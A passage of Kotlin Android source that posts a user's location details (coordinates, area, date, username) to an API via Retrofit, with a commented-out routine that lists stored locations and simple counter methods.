            locationDetails = LocationModel(l?.getLatitude(), l?.getLongitude(), l?.getArea(), l?.getDate(), l?.getUsername())


            var call: Call<LocationModel?>?
            try {
                call = jsonPlaceHolderApi!!.sendLocationDetailsIntoApi(locationDetails)
                call!!.enqueue(object : Callback<LocationModel?> {
                    override fun onResponse(
                            call: Call<LocationModel?>,
                            response: Response<LocationModel?>
                    ) {
                        if (!response.isSuccessful) {
                            return
                        }

                    }

                    override fun onFailure(call: Call<LocationModel?>, t: Throwable) {

                    }
                })

            } catch (e: java.lang.Exception) {
                println(e)
            }
        }

    }

    /*
    fun getLocationDataFromApi() {
        val call = jsonPlaceHolderApi!!.getLocationFromApi()
        call!!.enqueue(object : Callback<List<LocationModel?>?> {


            override fun onResponse(
                    call: Call<List<LocationModel?>?>,
                    response: Response<List<LocationModel?>?>
            ) {
                if (!response.isSuccessful) {
                    textViewResult!!.text = "code " + response.code()

                }
                val callData = response.body()!!
                for (post in callData) {
                    var content = ""
                    //    content += "\nId :" + post!!.getId()
                    content += "\nLatitude: " + post!!.getLatitude()
                    content += "\nLongitude: " + post!!.getLongitude()
                    content += "\nArea: " + post!!.getArea()
                    content += "\nDate: " + post.getDate()
                    content += "\nUsername: " + post!!.getUsername()
                    content += "\n\n"
                    textViewResult!!.append(content)
                }
            }


            override fun onFailure(call: Call<List<LocationModel?>?>, t: Throwable) {
            }
        })
    }


     */














    fun onButtonClickListener() {
        resetBtn = findViewById<View>(R.id.resetBtn) as Button
        resetBtn!!.setOnClickListener {
           initCounter()
        }
    }

    public fun initCounter() {
        counter = 0
        counterTxt!!.text = counter.toString() + ""
    }



    public fun plusCounter() {
        counter++
        counterTxt!!.text = counter.toString() + ""
    }

//    fun getUserName(): String?
//    {
//        var sp:SharedPreferences = getSharedPreferences("login", Context.MODE_PRIVATE)
//            var username: String? = sp.getString("username", "phone")
//        return username
//    }



}